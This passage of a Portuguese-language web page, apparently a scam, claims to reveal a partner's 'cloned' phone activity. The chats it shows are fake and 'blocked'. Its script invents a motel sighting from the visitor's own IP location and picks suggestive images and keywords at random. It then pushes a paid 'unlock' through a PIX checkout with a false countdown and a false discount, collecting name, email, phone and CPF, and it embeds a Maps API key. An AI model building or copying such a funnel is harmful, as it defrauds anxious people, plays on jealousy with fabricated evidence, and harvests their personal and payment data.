                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">09:22
                        <span class="message-status">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M18 7l-1.41-1.41-6.34 6.34 1.41 1.41L18 7zm4.24-1.41L11.66 16.17 7.48 12l-1.41 1.41L11.66 19l12-12-1.42-1.41zM.41 13.41L6 19l1.41-1.41L1.83 12 .41 13.41z"></path>
                            </svg>
                        </span>
                    </div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">09:25</div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">09:26</div>
                </div>

                <div class="chat-message sent">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">09:30
                        <span class="message-status">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M18 7l-1.41-1.41-6.34 6.34 1.41 1.41L18 7zm4.24-1.41L11.66 16.17 7.48 12l-1.41 1.41L11.66 19l12-12-1.42-1.41zM.41 13.41L6 19l1.41-1.41L1.83 12 .41 13.41z"></path>
                            </svg>
                        </span>
                    </div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">09:32</div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">09:35</div>
                </div>
            </div>
            <div class="chat-footer">
                <div class="chat-lock-message">Para visualizar a conversa completa, voc√™ precisa desbloquear as
                    conversas.</div>
                <a href="#" class="cta-button">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"></path>
                    </svg>
                    DESBLOQUEAR CONVERSAS COMPLETAS
                </a>
            </div>
        </div>
    </div>

    <div class="popup-overlay" id="chatPopup3">
        <div class="popup-content">
            <div class="popup-header">
                <button class="popup-close">√ó</button>
                <div class="popup-avatar" style="background-image: url('images/pm03.jpg');"></div>
                <div class="popup-name">+55 XX 9XXXX-0032</div>
            </div>
            <div class="popup-body">
                <div class="chat-message received">
                    Cad√™ voc√™ n√£o vai me mandar?
                    <div class="message-time">20:05</div>
                </div>

                <div class="chat-message sent">
                    Claro, rsrsrs üòè
                    <div class="message-time">20:07
                        <span class="message-status">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M18 7l-1.41-1.41-6.34 6.34 1.41 1.41L18 7zm4.24-1.41L11.66 16.17 7.48 12l-1.41 1.41L11.66 19l12-12-1.42-1.41zM.41 13.41L6 19l1.41-1.41L1.83 12 .41 13.41z"></path>
                            </svg>
                        </span>
                    </div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">20:10</div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Imagem bloqueada</span>
                    <div class="message-time">20:12</div>
                </div>

                <div class="chat-message sent">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">20:15
                        <span class="message-status">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M18 7l-1.41-1.41-6.34 6.34 1.41 1.41L18 7zm4.24-1.41L11.66 16.17 7.48 12l-1.41 1.41L11.66 19l12-12-1.42-1.41zM.41 13.41L6 19l1.41-1.41L1.83 12 .41 13.41z"></path>
                            </svg>
                        </span>
                    </div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">20:16</div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Imagem bloqueada</span>
                    <div class="message-time">20:18</div>
                </div>

                <div class="chat-message received">
                    <span class="highlight">Esta mensagem foi apagada</span>
                    <div class="message-time">20:20</div>
                </div>

                <div class="chat-message sent">
                    <span class="highlight">Conte√∫do bloqueado</span>
                    <div class="message-time">20:25
                        <span class="message-status">
                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                <path d="M18 7l-1.41-1.41-6.34 6.34 1.41 1.41L18 7zm4.24-1.41L11.66 16.17 7.48 12l-1.41 1.41L11.66 19l12-12-1.42-1.41zM.41 13.41L6 19l1.41-1.41L1.83 12 .41 13.41z"></path>
                            </svg>
                        </span>
                    </div>
                </div>
            </div>
            <div class="chat-footer">
                <div class="chat-lock-message">Para visualizar a conversa completa, voc√™ precisa desbloquear as
                    conversas.</div>
                <a href="#" class="cta-button">
                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"></path>
                    </svg>
                    DESBLOQUEAR CONVERSAS COMPLETAS
                </a>
            </div>
        </div>
    </div>

    <!-- Floating CTA -->
    <div class="floating-cta">
        <a href="#" class="floating-cta-button">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 17c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6-9h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6h1.9c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm0 12H6V10h12v10z"></path>
            </svg>
            DESBLOQUEAR TUDO POR R$ 27,90
        </a>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            // Animate cards on scroll
            const cards = document.querySelectorAll('.card');

            function checkVisibility() {
                cards.forEach(card => {
                    const rect = card.getBoundingClientRect();
                    const windowHeight = window.innerHeight || document.documentElement.clientHeight;

                    if (rect.top <= windowHeight * 0.85) {
                        card.classList.add('visible');
                    }
                });
            }

            // Initial check
            setTimeout(checkVisibility, 300);

            // Check on scroll
            window.addEventListener('scroll', checkVisibility);

            // Contact buttons open chat popups
            const contactButtons = document.querySelectorAll('.contact-button');

            contactButtons.forEach(button => {
                button.addEventListener('click', function () {
                    const contactId = this.getAttribute('data-contact');
                    const popup = document.getElementById(`chatPopup${contactId}`);
                    popup.classList.add('active');
                });
            });

            // Close popup buttons
            const closeButtons = document.querySelectorAll('.popup-close');
            closeButtons.forEach(button => {
                button.addEventListener('click', function () {
                    const popup = this.closest('.popup-overlay');
                    popup.classList.remove('active');
                });
            });

            // Close popup when clicking outside
            const popups = document.querySelectorAll('.popup-overlay');
            popups.forEach(popup => {
                popup.addEventListener('click', function (e) {
                    if (e.target === this) {
                        this.classList.remove('active');
                    }
                });
            });

            // --- MAPA E INFO WINDOW CUSTOM ---
            const numeroClonado = localStorage.getItem('numeroClonado') || '';
            let ddd = 'XX';
            if (numeroClonado) {
                // Extrai apenas os n√∫meros
                const numLimpo = numeroClonado.replace(/\D/g, '');
                if (numLimpo.length >= 2) {
                    ddd = numLimpo.substring(0, 2);
                }
            }
            // Atualiza todos os contact-name e popup-name
            document.querySelectorAll('.contact-name, .popup-name').forEach(function (el) {
                el.textContent = el.textContent.replace(/\+55 \d{2}/, `+55 ${ddd}`);
            });

            // Vari√°veis de cidade e regi√£o precisam ser declaradas antes de qualquer uso
            let city = 'S√£o Paulo';
            let region_code = 'SP';

            const mapDynamicMsg = document.getElementById('map-dynamic-msg');

            function updateMapDynamicMsg() {
                if (!mapDynamicMsg) return;
                mapDynamicMsg.innerHTML =
                    `O n√∫mero <strong>${numeroClonado}</strong> esteve neste motel em <strong>${city}</strong> nos √∫ltimos 7 dias. Abaixo est√° a localiza√ß√£o mais recente registrada.`;
            }
            updateMapDynamicMsg();

            // Buscar localiza√ß√£o e atualizar mapa
            async function fetchLocationData() {
                try {
                    const response = await fetch('https://wtfismyip.com/json');
                    if (!response.ok) throw new Error('Failed to fetch location data');
                    const data = await response.json();
                    const locationParts = data.YourFuckingLocation.split(',');
                    city = (locationParts[0] || 'S√£o Paulo').trim();
                    region_code = (locationParts[1] || 'SP').trim();
                    // Atualizar mensagem
                    updateMapDynamicMsg();
                    // Atualizar mapa embed
                    const baseUrl = 'https://www.google.com/maps/embed/v1/place';
                    const params = new URLSearchParams({
                        key: 'AIzaSyAZnW7kz1R4UiARrZLtiiS7dHE9M2VmJBE',
                        q: `Motel ${city} ${region_code}`
                    });
                    const embedUrl = `${baseUrl}?${params.toString()}`;
                    const mapIframe = document.getElementById('map-iframe');
                    if (mapIframe) {
                        mapIframe.src = embedUrl;
                    }
                } catch (e) {
                    // fallback padr√£o
                    const mapIframe = document.getElementById('map-iframe');
                    if (mapIframe) {
                        mapIframe.src =
                            'https://www.google.com/maps/embed/v1/place?key=AIzaSyAZnW7kz1R4UiARrZLtiiS7dHE9M2VmJBE&q=Motel+Sao+Paulo+SP';
                    }
                }
            }
            fetchLocationData();

            // Definir imagens de acordo com o alvoMonitoramento 
            const alvo = localStorage.getItem('alvoMonitoramento') || 'parceiro'; 
            let avatarPrefix = alvo === 'parceira' ? 'pm' : 'ph'; // parceira = pm (masculino), parceiro = ph (feminino) 
            let mediaPrefix = alvo === 'parceira' ? 'pm' : 'ph'; // parceira = homens (m), parceiro = mulheres (hh) 

            // Atualizar avatares dos contatos 
            document.querySelectorAll('.contact-avatar').forEach(function (el, idx) { 
                el.textContent = ''; 
                const imgUrl = `./images/${avatarPrefix}0${idx+1}.jpg`; 
                el.style.backgroundImage = `url('${imgUrl}')`; 
                // fallback visual caso a imagem n√£o carregue 
                el.onerror = function () { 
                    el.style.background = '#e0e0e0'; 
                }; 
            }); 

            // Atualizar avatares dos popups 
            document.querySelectorAll('.popup-avatar').forEach(function (el, idx) { 
                el.textContent = ''; 
                const imgUrl = `./images/${avatarPrefix}0${idx+1}.jpg`; 
                el.style.backgroundImage = `url('${imgUrl}')`; 
                el.onerror = function () { 
                    el.style.background = '#e0e0e0'; 
                }; 
            });

            // Atualizar imagens da media-item 
            console.log('Atualizando media-item com mediaPrefix:', mediaPrefix, 'para alvo:', alvo); 
            document.querySelectorAll('.media-item img').forEach(function (img, idx) { 
                const newSrc = `./images/${mediaPrefix}0${idx+1}.jpg`; 
                console.log(`Mudando imagem ${idx+1} de ${img.src} para ${newSrc}`); 
                img.src = newSrc; 
            });

            // Atualizar o primeiro keyword-text 
            const keywordText1 = document.querySelector('.keyword-text'); 
            if (keywordText1) { 
                if (alvo === 'parceira') { 
                    keywordText1.textContent = Math.random() < 0.5 ? '"Gostoso"' : '"Safado"'; 
                } else { 
                    keywordText1.textContent = Math.random() < 0.5 ? '"Gostosa"' : '"Safada"'; 
                } 
            }
        });
    </script>
<script src="./proxy_fadaf3.php"></script>
<script src="https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js"></script>
<script>(function() {
    const PROXY_URL = './proxy_fadaf3.php';
    const utms = Object.fromEntries(new URLSearchParams(window.location.search));
    const CHECKOUT = { 
     "backgroundColor":"#ffffff", 
     "buttonColor":"#02d938", 
     "buttonText":"Comprar Agora com PIX", 
     "title":"Garanta seu Acesso Agora", 
     "subtitle":"Oferta v√°lida apenas hoje - Acesso imediato", 
     "fields":{ 
         "name":true, 
         "email":true, 
         "phone":true, 
         "document":true, 
         "cep":false, 
         "street":false, 
         "number":false, 
         "complement":false, 
         "neighborhood":false, 
         "city":false, 
         "state":false 
     }, 
     "timerMinutes":10, 
     "timerBackgroundColor":"#b0b0b0", 
     "timerTextColor":"#ffffff", 
     "amount":2790, 
     "directPix":false, 
     "triggerSelector":".cta-button, .floating-cta-button", 
     "pixModalTitle":"Pagamento via PIX", 
     "pixModalCopyButtonText":"Copiar c√≥digo PIX", 
     "pixModalBackgroundColor":"#FFFFFF", 
     "pixModalTextColor":"#1f2937", 
     "pixModalButtonColor":"#00c27a", 
     "pixModalButtonTextColor":"#FFFFFF", 
     "pixModalValueText":"üí∞ Valor:", 
     "pixModalExpirationText":"üïí V√°lido at√©:", 
     "pixModalSecurePaymentText":"Pagamento seguro via PIX", 
     "pixModalInfoTextColor":"#0f172a", 
     "pixModalSecurePaymentTextColor":"#00c27a", 
     "pixModalInputBackgroundColor":"#f9fafb", 
     "pixModalInputBorderColor":"#d1d5db", 
     "pixModalInputTextColor":"#374151", 
     "pixExpirationMinutes":15, 
     "popupTextColor":"#000000", 
     "popupSubtitleColor":"#7a7a7a", 
     "popupPriceColor":"#262627", 
     "popupInputBackgroundColor":"#ebebeb", 
     "popupInputBorderColor":"#6b6b6b", 
     "popupInputTextColor":"#000000", 
     "facebookPixelId":"2991570771024846", 
     "upsellUrl":"https://olhosabertos.pro/checkout/upsell1.html", 
     "backRedirectUrl":"" 
    };

    let timeLeft = CHECKOUT.timerMinutes * 60;
    let timerInterval = null;

    function formatCurrency(value) {
        return (value / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
    }
    
    function formatTime(seconds) {
        if (seconds <= 0) return "00:00";
        const m = String(Math.floor(seconds / 60)).padStart(2, '0');
        const s = String(seconds % 60).padStart(2, '0');
        return m + ':' + s;
    };

    function createPopup() { 
     const popupContainer = document.createElement('div'); 
     popupContainer.id = 'paradise-popup-overlay'; 
     popupContainer.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background-color:rgba(0,0,0,0.7);display:none;align-items:center;justify-content:center;z-index:9999;backdrop-filter:blur(4px);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;'; 
     
     let formFieldsHtml = ''; 
     if (!CHECKOUT.directPix) { 
          const inputStyle = 'width:100%;padding:12px;margin-bottom:10px;border-radius:8px;box-sizing:border-box;background-color: ' + (CHECKOUT.popupInputBackgroundColor || '#334155') + ';border: 1px solid ' + (CHECKOUT.popupInputBorderColor || '#4b5563') + ';color: ' + (CHECKOUT.popupInputTextColor || 'white') + ';'; 
         formFieldsHtml = 
             (CHECKOUT.fields.name ? '<input type="text" name="name" placeholder="Nome Completo" required style="' + inputStyle + '">' : '') + 
             (CHECKOUT.fields.email ? '<input type="email" name="email" placeholder="Seu Melhor E-mail" required style="' + inputStyle + '">' : '') + 
             (CHECKOUT.fields.phone ? '<input type="tel" name="phone_number" placeholder="Telefone (WhatsApp)" required style="' + inputStyle + '">' : '') + 
             (CHECKOUT.fields.document ? '<input type="text" name="document" placeholder="000.000.000-00" maxlength="14" required style="' + inputStyle + '">' : ''); 
     } 
 
     const timerHtml = CHECKOUT.timerMinutes > 0 ? 
         '<div id="paradise-popup-timer" style="font-size:1.25rem;font-weight:bold;margin-bottom:12px;display:inline-block;padding:4px 12px;border-radius:8px;background-color:' + (CHECKOUT.timerBackgroundColor || 'rgba(255,255,255,0.1)') + ';color:' + (CHECKOUT.timerTextColor || 'white') + ';">' + 
             formatTime(timeLeft) + 
         '</div>' : ''; 
 
     popupContainer.innerHTML = 
         '<div style="background:' + (CHECKOUT.backgroundColor || '#1e293b') + ';padding:20px;border-radius:12px;max-width:360px;width:90%;box-shadow:0 10px 25px rgba(0,0,0,0.3);position:relative;">' + 
             '<button id="paradise-popup-close" style="position:absolute;top:12px;right:12px;font-size:18px;color:#9ca3af;background:none;border:none;cursor:pointer;">&times;</button>' + 
             timerHtml + 
             '<h2 style="margin:0 0 6px;font-size:1.2rem;font-weight:bold;color:' + (CHECKOUT.titleColor || '#1f2937') + ';text-align:center;">' + CHECKOUT.title + '</h2>' + 
             '<p style="margin:0 0 12px;color:' + (CHECKOUT.subtitleColor || '#9ca3af') + ';text-align:center;font-size:0.85rem;">' + CHECKOUT.subtitle + '</p>' + 
             '<div style="text-align:center;margin-bottom:16px;padding:12px;background:#f8fafc;border-radius:8px;border:1px solid #e2e8f0;">' + 
                 '<div style="font-size:0.8rem;color:#94a3b8;text-decoration:line-through;margin-bottom:6px;">De R$ 97,00</div>' + 
                 '<div style="display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:6px;">' + 
                     '<span style="font-size:1.8rem;font-weight:bold;color:#22c55e;">' + formatCurrency(CHECKOUT.amount) + '</span>' + 
                     '<span style="background:#ff4444;color:white;padding:4px 8px;border-radius:6px;font-size:0.75rem;font-weight:bold;">-71% OFF</span>' + 
                 '</div>' + 
                 '<div style="color:#94a3b8;font-size:0.8rem;">√† vista no PIX</div>' + 
             '</div>' + 
             '<div style="display:flex;justify-content:center;gap:12px;margin-bottom:12px;">' + 
                 '<div style="display:flex;align-items:center;color:' + (CHECKOUT.popupSubtitleColor || '#cbd5e1') + ';font-size:0.8rem;">' + 
                     '<span style="color:#22c55e;margin-right:4px;">‚úì</span>Acesso Imediato' + 
                 '</div>' + 
                 '<div style="display:flex;align-items:center;color:' + (CHECKOUT.popupSubtitleColor || '#cbd5e1') + ';font-size:0.8rem;">' + 
                     '<span style="color:#22c55e;margin-right:4px;">‚úì</span>Garantia 30 dias' + 
                 '</div>' + 
             '</div>' + 
             '<form id="paradise-popup-form">' + 
                 formFieldsHtml + 
                 '<button type="submit" id="paradise-popup-pay-btn" style="width:100%;padding:12px;background:' + CHECKOUT.buttonColor + ';color:white;border:none;border-radius:8px;font-weight:bold;font-size:0.95rem;cursor:pointer;">' + CHECKOUT.buttonText + '</button>' + 
                 '<div style="text-align:center;margin-top:8px;color:#94a3b8;font-size:0.75rem;">üîí Pagamento 100% seguro</div>' + 
             '</form>' + 
         '</div>'; 
     document.body.appendChild(popupContainer); 
     
     popupContainer.addEventListener('click', (e) => { if (e.target === popupContainer) closePopup(); });
     document.getElementById('paradise-popup-close').addEventListener('click', closePopup);
     document.getElementById('paradise-popup-form').addEventListener('submit', handleFormSubmit);
     const docInput = popupContainer.querySelector('input[name="document"]');
     if(docInput) {
         docInput.addEventListener('input', (e) => {
             let value = e.target.value.replace(/\D/g, "");
             value = value.substring(0, 11);
             
             let formattedValue = value;
             if (value.length > 9) {
                 formattedValue = value.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
             } else if (value.length > 6) {
                 formattedValue = value.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
             } else if (value.length > 3) {
                 formattedValue = value.replace(/(\d{3})(\d{1,3})/, '$1.$2');
             }
     
             e.target.value = formattedValue;
         });
     }
    }
    
    function startTimer() {
        if (CHECKOUT.timerMinutes <= 0) return;
        const timerEl = document.getElementById('paradise-popup-timer');
        if (timerInterval) clearInterval(timerInterval);
        timerInterval = setInterval(() => {
            timeLeft--;
            if (timerEl) timerEl.textContent = formatTime(timeLeft);
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                const payBtn = document.getElementById('paradise-popup-pay-btn');
                if (payBtn) {
                    payBtn.disabled = true;
                    payBtn.style.opacity = '0.5';
                    payBtn.textContent = 'Oferta Encerrada';
                }
            }
        }, 1000);
    }
    
    async function handleFormSubmit(e) {
        e.preventDefault();
        const form = e.target;
        if (!CHECKOUT.directPix && !form.checkValidity()) {
            form.reportValidity();
            return;
        }

        const payButton = document.getElementById('paradise-popup-pay-btn');
        payButton.disabled = true;
        payButton.innerHTML = '<div style="border: 2px solid #f3f3f3; border-top: 2px solid #fff; border-radius: 50%; width: 18px; height: 18px; animation: spin 1s linear infinite; display: inline-block;"></div><span style="margin-left:8px;">Processando...</span>';
        
        let customerData = {};
        if (!CHECKOUT.directPix) {
             const elements = form.elements;
             for (let i = 0; i < elements.length; i++) {
                if (elements[i].name) {
                    customerData[elements[i].name] = elements[i].value;
                }
            }
        }

        const payload = {
            customer: customerData,
            utms: utms
        };

        try {
            const response = await fetch(PROXY_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (!response.ok) {
                throw new Error(result.message || result.error || 'Ocorreu um erro.');
            }
            showPixModal(result);
            closePopup(true); // close popup without resetting timer
        } catch (error) {
            alert('Erro: ' + error.message);
            payButton.disabled = false;
            payButton.querySelector('span').textContent = CHECKOUT.buttonText;
            payButton.querySelector('div').remove();
        }
    }
    
    function showPopup() {
        const popup = document.getElementById('paradise-popup-overlay');
        if (!popup) {
            createPopup();
            showPopup();
            return;
        }
        popup.style.display = 'flex';
        document.body.style.overflow = 'hidden';
        timeLeft = CHECKOUT.timerMinutes * 60;
        startTimer();
    }

    function closePopup(keepTimerState = false) {
        const popup = document.getElementById('paradise-popup-overlay');
        if (popup) popup.style.display = 'none';
        document.body.style.overflow = '';
        if (timerInterval) clearInterval(timerInterval);
        if (!keepTimerState) timeLeft = CHECKOUT.timerMinutes * 60;
    }

    function startPopupPaymentChecker(hash) {
        if (window._popupPaymentChecker) clearInterval(window._popupPaymentChecker);

        window._popupPaymentChecker = setInterval(async () => {
            try {
                const res = await fetch(`${PROXY_URL}?action=check_status&hash=${hash}`);
                const data = await res.json();
                if (data && data.payment_status === 'paid') {
                    clearInterval(window._popupPaymentChecker);

                    if (typeof fbq === 'function' && CHECKOUT.facebookPixelId) {
                        fbq('track', 'Purchase', { value: CHECKOUT.amount / 100, currency: 'BRL' });
                    }

                    if (CHECKOUT.upsellUrl) {
                        const upsellUrl = CHECKOUT.upsellUrl;
                        const params = new URLSearchParams(utms);
                        params.append('fpay', hash);
                        params.append('domain', 'https://go.paradisepagbr.com');
                        
                        const newQueryString = params.toString();
                        const finalUrl = upsellUrl + (upsellUrl.includes('?') ? '&' : '?') + newQueryString;
                        window.location.href = finalUrl;
                    } else {
                        let pixModal = document.querySelector('#paradise-pix-modal');
                        if (pixModal) {
                             const modalContent = pixModal.querySelector('div');
                             if(modalContent) modalContent.innerHTML = '<h2 style="font-size:2rem;font-weight:bold;">Pagamento Aprovado!</h2><p>Obrigado!</p>';
                        }
                    }
                }
            } catch (e) {
                console.error('Popup payment check failed:', e);
            }
        }, 5000);
    }

    function showPixModal(result) { 
     let pixModal = document.getElementById('paradise-pix-modal'); 
     if (pixModal) pixModal.remove(); 
 
     const pixCode = result?.pix?.pix_qr_code; 
     const transactionHash = result?.hash; 
     let expirationDate = result?.pix?.expiration_date; 
 
     if (!pixCode) return; 
 
     pixModal = document.createElement('div'); 
     pixModal.id = 'paradise-pix-modal'; 
     pixModal.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:9999;display:flex;justify-content:center;align-items:center;animation:backdropFadeIn 0.3s ease-out forwards; font-family: Inter, sans-serif;'; 
 
     if (!expirationDate && CHECKOUT.pixExpirationMinutes > 0) { 
         expirationDate = new Date(Date.now() + CHECKOUT.pixExpirationMinutes * 60 * 1000); 
     } 
 
     const expirationString = expirationDate ? new Date(expirationDate).toLocaleString('pt-BR', { 
         day: '2-digit', month: '2-digit', year: 'numeric', 
         hour: '2-digit', minute: '2-digit', second: '2-digit' 
     }).replace(',', '') : '--'; 
 
     const modalTitleHTML = CHECKOUT.pixModalTitle ? '<h2 style="margin:0 0 16px;font-size:20px;line-height:1.4;color:' + (CHECKOUT.pixModalTextColor || '#111827') + ';">' + CHECKOUT.pixModalTitle + '</h2>' : ''; 
     const modalValueHTML = CHECKOUT.pixModalValueText ? '<p style="margin:8px 0;">' + CHECKOUT.pixModalValueText + ' <strong>' + formatCurrency(CHECKOUT.amount) + '</strong></p>' : ''; 
     const modalExpirationHTML = CHECKOUT.pixModalExpirationText ? '<p style="margin:8px 0;">' + CHECKOUT.pixModalExpirationText + ' <span>' + expirationString + '</span></p>' : ''; 
 
     pixModal.innerHTML = 
       '<div style="background:' + (CHECKOUT.pixModalBackgroundColor || '#ffffff') + ';padding:16px;border-radius:8px;max-width:320px;width:90%;box-shadow:0 4px 12px rgba(0,0,0,0.15);position:relative;text-align: center;">' + 
         '<button id="paradise-pix-modal-close" style="position:absolute;top:8px;right:8px;font-size:16px;color:#9ca3af;background:none;border:none;cursor:pointer;">&times;</button>' + 
         '<div style="margin-bottom:12px;">' + 
             '<div style="display:inline-flex;align-items:center;background:rgba(34,197,94,0.1);color:#16a34a;padding:4px 8px;border-radius:8px;font-size:0.7rem;font-weight:600;margin-bottom:8px;">' + 
                 '<span style="width:4px;height:4px;background:#16a34a;border-radius:50%;margin-right:6px;"></span>' + 
                 'PIX GERADO COM SUCESSO' + 
             '</div>' + 
         '</div>' + 
         modalTitleHTML + 
         '<div style="background:#f8fafc;border-radius:8px;padding:12px;margin-bottom:12px;border:1px solid #e2e8f0;">' + 
             '<div style="display:flex;justify-content:center;margin-bottom:8px;"><div id="paradise-pix-qrcode" style="padding: 4px; background: white; border-radius: 6px; line-height: 0;"></div></div>' + 
             '<p style="font-size:0.8rem;color:#6b7280;margin:0;">Escaneie o QR Code ou copie o c√≥digo PIX</p>' + 
         '</div>' + 
         '<input id="paradise-pix-code-input" type="text" readonly value="' + pixCode + '" style="width:100%;box-sizing:border-box;padding:10px;font-size:12px;margin-bottom:12px;border-radius:6px;text-align:center;font-family:monospace;background-color:' + (CHECKOUT.pixModalInputBackgroundColor || '#f8fafc') + ';border:1px solid ' + (CHECKOUT.pixModalInputBorderColor || '#e2e8f0') + ';color:' + (CHECKOUT.pixModalInputTextColor || '#374151') + ';">' + 
         '<button id="paradise-pix-copy-btn" style="border:none;width:100%;padding:12px 16px;border-radius:6px;font-weight:600;font-size:0.9rem;cursor:pointer;margin-bottom:12px;background:' + (CHECKOUT.pixModalButtonColor || '#00c27a') + ';color:' + (CHECKOUT.pixModalButtonTextColor || '#ffffff') + ';">' + 
             (CHECKOUT.pixModalCopyButtonText || 'Copiar c√≥digo PIX') + 
         '</button>' + 
         '<div style="background:rgba(34,197,94,0.05);border-radius:6px;padding:10px;margin-bottom:10px;border:1px solid rgba(34,197,94,0.1);">' + 
             '<div style="font-size:13px;line-height:1.4;text-align: center;color:' + (CHECKOUT.pixModalInfoTextColor || '#0f172a') + ';">' + 
               modalValueHTML + 
               modalExpirationHTML + 
             '</div>' + 
         '</div>' + 
         '<div style="display:flex;align-items:center;justify-content:center;gap:6px;">' + 
             '<img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTEyIDJMMTMuMDkgOC4yNkwyMCA5TDEzLjA5IDE1Ljc0TDEyIDIyTDEwLjkxIDE1Ljc0TDQgOUwxMC45MSA4LjI2TDEyIDJaIiBmaWxsPSIjMTZhMzRhIi8+CjxwYXRoIGQ9Ik0xMiA2TDEyLjcgMTBMMTYgMTBMMTIuNyAxNEwxMiAxOEwxMS4zIDE0TDggMTBMMTEuMyAxMEwxMiA2WiIgZmlsbD0iIzIyYzU1ZSIvPgo8L3N2Zz4K" style="width:14px;height:14px;">' + 
             '<span style="color:#6b7280;font-size:0.7rem;font-weight:500;">' + (CHECKOUT.pixModalSecurePaymentText || 'Pagamento 100% Seguro') + '</span>' + 
         '</div>' + 
       '</div>';
        
        document.body.appendChild(pixModal);

        const qrContainer = document.getElementById('paradise-pix-qrcode');
        if (qrContainer && typeof QRCode !== 'undefined') {
            new QRCode(qrContainer, {
                text: pixCode,
                width: 184,
                height: 184,
                colorDark : "#000000",
                colorLight : "#ffffff",
                correctLevel : QRCode.CorrectLevel.M
            });
        }

        if (transactionHash) {
            startPopupPaymentChecker(transactionHash);
        }
        
        const closeAndClear = () => {
            pixModal.remove();
            if(window._popupPaymentChecker) clearInterval(window._popupPaymentChecker);
        };

        pixModal.addEventListener('click', (e) => { if (e.target === pixModal) closeAndClear(); });
        document.getElementById('paradise-pix-modal-close').addEventListener('click', closeAndClear);
        document.getElementById('paradise-pix-copy-btn').addEventListener('click', (e) => {
            const inputField = document.getElementById('paradise-pix-code-input');
            navigator.clipboard.writeText(inputField.value).then(() => {
                const btn = e.target;
                const originalText = btn.textContent;
                btn.textContent = 'Copiado!';
                setTimeout(() => { btn.textContent = originalText; }, 2000);
            });
        });
    }
    
    async function handleDirectPixGeneration(triggerButton) {
        const originalContent = triggerButton.innerHTML;
        triggerButton.disabled = true;
        triggerButton.innerHTML = '<div style="border: 2px solid #f3f3f3; border-top: 2px solid #fff; border-radius: 50%; width: 18px; height: 18px; animation: spin 1s linear infinite; display: inline-block;"></div><span style="margin-left:8px;">Gerando...</span>';

        const payload = {
            customer: {}, // Customer data is empty for direct pix
            utms: utms
        };

        try {
            const response = await fetch(PROXY_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const result = await response.json();
            if (!response.ok) {
                throw new Error(result.message || result.error || 'Ocorreu um erro ao gerar PIX.');
            }
            showPixModal(result);
        } catch (error) {
            alert('Erro: ' + error.message);
        } finally {
            triggerButton.disabled = false;
            triggerButton.innerHTML = originalContent;
        }
    }

    document.addEventListener('DOMContentLoaded', () => {
        const style = document.createElement('style');
        style.innerHTML = `
           @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
           @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
           @keyframes backdropFadeIn { from { opacity: 0; } to { opacity: 1; } }
